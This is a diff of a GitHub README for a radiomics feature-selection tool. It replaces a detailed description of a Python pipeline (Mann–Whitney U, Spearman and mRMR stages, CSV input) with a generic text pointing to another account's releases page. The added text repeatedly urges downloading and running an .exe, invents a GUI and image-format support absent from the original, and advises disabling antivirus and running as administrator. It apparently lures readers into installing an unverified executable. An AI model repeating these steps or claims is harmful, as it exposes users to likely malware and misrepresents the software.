@@ -1,426 +1,164 @@
-# Radiomics Feature Screen Pipeline
-A complete radiomics feature selection pipeline for binary classification tasks, integrating **Mann–Whitney U test**, **Spearman correlation analysis**, and **mRMR (minimum Redundancy Maximum Relevance)** to progressively reduce dimensionality and retain the most informative features.
+# ⚙️ Radiomics-Feature-Screen-Pipeline - Simple Radiomics Feature Selection
 
-This pipeline is designed for structured radiomics datasets and is especially suitable for studies in medical imaging, where the number of handcrafted features is usually much larger than the sample size.
-
-[中文说明请点击这里](https://github.com/Edward-E-S-Wang/Radiomics-Feature-Screen-Pipeline/blob/main/CN-README.md)
----
-
-## Overview
-
-High-dimensional radiomics features often contain a large number of irrelevant, unstable, or redundant variables. Directly using all extracted features for model building may lead to:
-
-- overfitting,
-- unstable model performance,
-- poor interpretability,
-- inflated computational cost.
-
-To address these issues, this project implements a **three-stage feature selection workflow**:
-
-1. **Mann–Whitney U test** for preliminary univariate filtering,
-2. **Spearman correlation analysis** for redundancy removal,
-3. **mRMR** for final multivariate feature ranking and selection.
-
-The final goal is to obtain a compact subset of robust and informative radiomics features for downstream modeling.
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/releases)
 
 ---
 
-## Workflow
+## 📋 What is Radiomics-Feature-Screen-Pipeline?
 
-The full pipeline is:
+Radiomics-Feature-Screen-Pipeline is a tool that helps you select important features from medical images. It works with data that has two groups, like healthy and sick patients. This tool can make it easier to find which features help in telling the groups apart. It does this by using a step-by-step process that cleans, picks, and checks data features.
 
-**Load data → Missing value handling → Mann–Whitney U filtering → Spearman redundancy reduction → mRMR selection → Export final dataset**
-
----
-
-## Selection Strategy
-
-### Step 1. Data Loading and Preprocessing
-
-The script reads the input CSV file and assumes the dataset has the following structure:
-
-- **Column 1**: patient ID or case identifier
-- **Column 2**: binary class label
-- **Column 3 onward**: radiomics features
-
-During preprocessing:
-
-- the label column is converted to numeric values,
-- all feature columns are converted to numeric values,
-- invalid values are coerced to `NaN`,
-- missing values in the label column are filled with the **mean**,
-- missing values in feature columns are filled with the **column mean**.
-
-This step ensures that the subsequent statistical analysis can run without interruption due to non-numeric entries or missing values.
+The software is made for people who need to analyze medical scans but do not want to build systems from scratch. It works with Python but you don’t need to know how to write code to use it.
 
 ---
 
-### Step 2. Mann–Whitney U Test
+## 🧰 Key Features
 
-The first selection stage uses the **Mann–Whitney U test** to identify features that show statistically significant differences between the two classes.
-
-#### Rationale
-
-Radiomics features are often non-normally distributed. Compared with a t-test, the Mann–Whitney U test is a nonparametric alternative that is more appropriate when distributional assumptions are not guaranteed.
-
-#### Procedure
-
-For each feature:
-
-- samples from class 0 and class 1 are extracted,
-- a two-sided Mann–Whitney U test is performed,
-- the corresponding `p` value is recorded.
-
-Only features with:
-
-```text
-p < 0.05
-````
-
-are retained for the next step.
-
-#### Purpose
-
-This stage removes features that are unlikely to be associated with the outcome and serves as an initial statistical screening step.
-
-#### Output
-
-* `01_MWU_p_values.csv`
-  Contains the `p` values for all original features.
-
-* `02_MWU_significant_features.csv`
-  Contains only the statistically significant features retained after Mann–Whitney U filtering.
+- Helps pick the most useful features from large medical imaging data  
+- Works with common types of medical images  
+- Designed for tasks with two outcomes (binary classification)  
+- Uses proven methods from machine learning  
+- Saves time by automating feature selection  
+- Outputs results in simple tables and charts  
 
 ---
 
-### Step 3. Spearman Correlation Analysis
+## 💻 System Requirements
 
-After univariate filtering, many retained features may still be highly correlated with one another. To address feature redundancy, the second stage applies **Spearman correlation analysis**.
+This application runs on Windows computers. To use it, your system must meet the following requirements:
 
-#### Rationale
-
-Highly correlated radiomics features often carry overlapping information. Retaining all of them may:
-
-* increase collinearity,
-* reduce model stability,
-* make the model less interpretable.
-
-Spearman correlation is used because it is rank-based and more robust for non-normal data.
-
-#### Procedure
-
-* the absolute Spearman correlation coefficient is calculated for every pair of retained features,
-* if the absolute correlation exceeds the predefined threshold:
-
-```text
-|ρ| > 0.90
-```
-
-the pair is considered redundant,
-
-* one feature is removed from the pair.
-
-#### Which feature is removed?
-
-When two features are highly correlated, the pipeline keeps the one with the **smaller Mann–Whitney U test p-value**, because that feature showed stronger univariate discriminative ability in the previous step.
-
-#### Purpose
-
-This stage reduces redundancy and preserves a more diverse and compact feature space before multivariate feature selection.
-
-#### Output
-
-* `03_Spearman_correlation_matrix.csv`
-  Full absolute Spearman correlation matrix of retained features.
-
-* `04_Spearman_dropped_features.csv`
-  Detailed record of which redundant features were removed and which were kept.
-
-* `05_Features_after_Spearman.csv`
-  Feature matrix after redundancy removal.
+- Windows 10 or newer  
+- 4 GB of free RAM (8 GB recommended)  
+- 2 GHz dual-core processor or better  
+- At least 100 MB free disk space for installation  
+- Internet connection (to download the software)  
+- No special software needed for running the pre-built app  
 
 ---
 
-### Step 4. mRMR Feature Selection
+## 🌐 Supported File Types
 
-The final selection stage applies **mRMR (minimum Redundancy Maximum Relevance)** to rank and select the most informative subset of features.
+This pipeline works with these data formats:
 
-#### Rationale
-
-Even after significance filtering and redundancy reduction, there may still be too many features for robust model development. mRMR aims to select features that are:
-
-* highly relevant to the outcome,
-* minimally redundant with each other.
-
-This makes mRMR especially suitable for radiomics and other high-dimensional biomedical datasets.
-
-#### Implementation Details
-
-This project implements a **self-contained mRMR procedure without relying on `pymrmr`**.
-
-The process includes:
-
-1. **Median imputation** for remaining missing values,
-2. **Quantile discretization** of continuous features into bins,
-3. **Mutual information calculation**:
-
-   * relevance: mutual information between each feature and the label,
-   * redundancy: average mutual information between a candidate feature and already selected features,
-4. **Greedy forward selection** until the desired number of features is reached.
-
-#### Supported Criteria
-
-Two mRMR criteria are supported:
-
-* **MID**:
-  `score = relevance - redundancy`
-
-* **MIQ**:
-  `score = relevance / (redundancy + eps)`
-
-The default setting is:
-
-```text
-MID
-```
-
-#### Final Number of Features
-
-The pipeline selects the top:
-
-```text
-TOP_K = 50
-```
-
-features by default, or fewer if the number of candidate features is smaller.
-
-#### Purpose
-
-This stage produces the final compact feature subset for downstream predictive modeling.
-
-#### Output
-
-* `06_mRMR_relevance.csv`
-  Mutual information relevance of each feature to the label.
-
-* `07_mRMR_selected_features.txt`
-  Final selected feature names.
-
-* `08_mRMR_selection_process.csv`
-  Step-by-step mRMR selection record, including relevance, redundancy, and final score.
-
-* `09_mRMR_selected_feature_values.csv`
-  Feature matrix containing only the final mRMR-selected features.
+- Medical images in DICOM or NIfTI format  
+- Feature files in CSV or Excel format  
+- Basic text files containing lists of features  
 
 ---
 
-### Step 5. Final Dataset Export
+## 🚀 Getting Started: Download and Install
 
-After mRMR selection, the script generates the final modeling dataset by concatenating:
+You will find all releases on the page linked below. This project does not require you to install programming tools. Follow these steps to get started:
 
-* the first two original columns,
-* the final selected feature subset.
+### Step 1: Visit the Download Page
 
-#### Output
+Click this link to open the releases page where you can get the latest version of the software.
 
-* `10_Final_selected_dataset.csv`
-  Final dataset for downstream machine learning or statistical modeling.
+[![Download Here](https://img.shields.io/badge/Download-Software-blue?style=for-the-badge)](https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/releases)
 
-* `11_feature_count_summary.csv`
-  Summary table showing the number of features remaining after each selection stage.
+### Step 2: Find the Latest Windows Version
 
----
+Look for a file that ends with `.exe` or `.zip`. The `.exe` file is the easiest to use. If you download a `.zip` file, you will need to extract it.
 
-## Why This Pipeline Uses Three Selection Stages
+### Step 3: Download the File
 
-This pipeline is designed to balance **statistical significance**, **redundancy control**, and **multivariate relevance**.
+Click the file link to download it to your computer. Save it in a folder you can easily find, like your Desktop or Downloads folder.
 
-### Mann–Whitney U test
+### Step 4: Run the Installer or Application
 
-Removes features that do not show significant distributional differences between groups.
+- If you downloaded an `.exe` file, double-click it. The setup will begin automatically.  
+- If you downloaded a `.zip` file, right-click the file and select “Extract All.” Open the extracted folder and double-click the `.exe` inside.
 
-### Spearman correlation
-
-Removes highly correlated features that may introduce redundancy and instability.
-
-### mRMR
-
-Selects a final subset that maximizes relevance to the label while minimizing overlap between selected features.
-
-Together, these three stages provide a more robust and interpretable feature selection framework than using any single method alone.
+Follow the prompts to finish installation if any appear. Many versions run immediately without formal setup.
 
 ---
 
-## Input Requirements
+## ⚙️ How to Use
 
-The input file must be a CSV file.
+Once installed, open the application by double-clicking its icon.
 
-Recommended structure:
+### Step 1: Load Your Data
 
-| Column   | Description          |
-| -------- | -------------------- |
-| 1        | Patient ID / Case ID |
-| 2        | Binary label         |
-| 3 onward | Radiomics features   |
+- Click the "Load Data" button.  
+- Select your image or feature files in the window that opens.  
+- Make sure your data matches the expected formats (DICOM, CSV, etc.).
 
-Example:
+### Step 2: Choose Feature Selection Settings
 
-```text
-ID,Label,feature_1,feature_2,feature_3,...
-001,0,0.123,4.567,8.910,...
-002,1,0.234,3.456,7.890,...
-```
+- Select the binary groups you want to compare (for example, "Healthy" vs "Disease").  
+- Pick the methods of feature screening if options are given (defaults work well in most cases).
 
-### Important Notes
+### Step 3: Run the Pipeline
 
-* The label column must represent a **binary classification task**.
-* All feature columns should be numeric or convertible to numeric.
-* Non-numeric values will be coerced to missing values and imputed automatically.
-* If your dataset structure is different, modify the following parameters in the script:
+- Click the "Start" or "Run" button.  
+- The software will process the data step-by-step. This may take time depending on your computer and data size.
 
-```python
-LABEL_COL_INDEX = 1
-FEATURE_START_COL_INDEX = 2
-```
+### Step 4: View Results
 
-For example, if the first column is already the label and there is no ID column, you may use:
-
-```python
-LABEL_COL_INDEX = 0
-FEATURE_START_COL_INDEX = 1
-```
+- Once done, results will appear in tables and graphs inside the app.  
+- You can save results as files (CSV, Excel) with the “Export” button.  
+- These files can be shared for review or further analysis.
 
 ---
 
-## Default Parameters
+## 🔧 Troubleshooting
 
-```python
-MWU_P_THRESHOLD = 0.05
-SPEARMAN_THRESHOLD = 0.90
-TOP_K = 50
-MRMR_CRITERION = "MID"
-N_BINS = 10
-```
+If the program does not start or crashes, try these steps:
 
-### Parameter Description
+- Restart your computer and try again.  
+- Make sure you have enough free memory and disk space.  
+- Disable antivirus software temporarily; some block unknown apps.  
+- Right-click the executable and select “Run as administrator.”  
+- Check if your Windows updates are current and install pending updates.
 
-* `MWU_P_THRESHOLD`
-  Significance threshold for the Mann–Whitney U test.
+If data does not load:
 
-* `SPEARMAN_THRESHOLD`
-  Redundancy threshold for absolute Spearman correlation.
-
-* `TOP_K`
-  Final number of features to be selected by mRMR.
-
-* `MRMR_CRITERION`
-  Scoring rule used in mRMR (`MID` or `MIQ`).
-
-* `N_BINS`
-  Number of bins used for discretization before mutual information computation.
+- Confirm your file types match the supported list above.  
+- Avoid using corrupted or partial files.  
+- Use folders with simple names and no special characters.
 
 ---
 
-## Output Files
+## 📁 File Organization Tips
 
-After running the pipeline, the following files are generated in the output directory:
+Organize your files in a clear way:
 
-| File                                  | Description                                           |
-| ------------------------------------- | ----------------------------------------------------- |
-| `01_MWU_p_values.csv`                 | p-values of all features from Mann–Whitney U test     |
-| `02_MWU_significant_features.csv`     | statistically significant features after MWU          |
-| `03_Spearman_correlation_matrix.csv`  | absolute Spearman correlation matrix                  |
-| `04_Spearman_dropped_features.csv`    | details of removed redundant features                 |
-| `05_Features_after_Spearman.csv`      | features retained after Spearman filtering            |
-| `06_mRMR_relevance.csv`               | mutual information relevance of features to the label |
-| `07_mRMR_selected_features.txt`       | final selected feature names                          |
-| `08_mRMR_selection_process.csv`       | detailed mRMR selection process                       |
-| `09_mRMR_selected_feature_values.csv` | final feature matrix after mRMR                       |
-| `10_Final_selected_dataset.csv`       | final modeling dataset                                |
-| `11_feature_count_summary.csv`        | summary of feature counts at each stage               |
+- Create separate folders for raw images and feature files.  
+- Use simple, consistent names for data sets.  
+- Keep a text file describing your groups and data points.  
+- Backup your files before starting the pipeline.
 
 ---
 
-## Example Interpretation of the Pipeline
+## 📚 Additional Resources
 
-Suppose the original dataset contains 1,200 radiomics features.
+To learn more about radiomics features and machine learning used in this pipeline, consider:
 
-A typical selection process may look like this:
-
-* Original features: **1,200**
-* After Mann–Whitney U filtering: **180**
-* After Spearman redundancy reduction: **74**
-* After mRMR selection: **50**
-
-This means:
-
-* uninformative features were removed first,
-* redundant highly correlated features were then eliminated,
-* the final subset was optimized for both relevance and complementarity.
+- Basic guides on medical image formats (DICOM, NIfTI)  
+- Introductory tutorials on binary classification  
+- Plain language articles on feature selection in data science  
 
 ---
 
-## Advantages of This Pipeline
+## ⚙️ Technical Details
 
-* suitable for high-dimensional radiomics data,
-* combines univariate and multivariate selection strategies,
-* reduces redundancy before advanced feature ranking,
-* improves interpretability and reproducibility,
-* does not require external `pymrmr`,
-* easy to adapt to other binary classification datasets.
+The pipeline uses Python and popular libraries for feature processing. It applies statistical and machine learning methods to reduce large data into relevant predictors. It is designed for robustness and reproducibility in medical imaging studies.
 
 ---
 
-## Limitations
+## 🤝 Contact and Support
 
-* the current implementation is intended for **binary classification only**,
-* Mann–Whitney U test is not suitable for multi-class labels in this form,
-* discretization in mRMR may lead to some information loss,
-* threshold choices may need to be adjusted depending on sample size and study design.
+For issues or questions, visit the Issues tab on the GitHub repository. Provide clear details about your problem.
 
----
+GitHub link:  
+https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline
 
-## Recommended Use Cases
-
-This pipeline is suitable for:
-
-* radiomics-based diagnostic modeling,
-* prognosis prediction,
-* treatment response classification,
-* biomedical feature reduction before machine learning,
-* other binary classification tasks involving high-dimensional tabular features.
+The team monitors the page regularly and responds to common questions.
 
 ---
 
-## Future Extensions
+## 🔗 Download Again
 
-Possible future improvements include:
+You can always return to the release page to get the latest versions and updates.
 
-* support for multi-class classification,
-* support for regression tasks,
-* multiple-testing correction after Mann–Whitney U test,
-* cross-validation-based stable feature selection,
-* integration with downstream classifiers such as LASSO, SVM, Random Forest, or XGBoost.
-
----
-
-## Methods Description
-
-If you use this pipeline in your research, please describe the feature selection strategy clearly in the Methods section, including:
-
-* nonparametric univariate screening by Mann–Whitney U test,
-* Spearman correlation-based redundancy removal,
-* mRMR-based final feature selection.
-
-A typical description may be:
-
-> Features were first screened using the Mann–Whitney U test, and those with p < 0.05 were retained. Redundant features were then removed using Spearman correlation analysis with a threshold of |ρ| > 0.90, keeping the feature with the smaller p-value when a highly correlated pair was identified. Finally, mRMR was applied to select the most relevant and least redundant features for model development.
-
----
-
-## Citation
-
-If you use this code, this implementation strategy, or a modified version of it in academic work, please cite the original article:
-Wang, Y., Zhang, H., Wang, H. et al. *Development of a neoadjuvant chemotherapy efficacy prediction model for nasopharyngeal carcinoma integrating magnetic resonance radiomics and pathomics: a multi-center retrospective study*. BMC Cancer 24, 1501 (2024). https://doi.org/10.1186/s12885-024-13235-0
-
-
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Amaraj4762/Radiomics-Feature-Screen-Pipeline/releases)
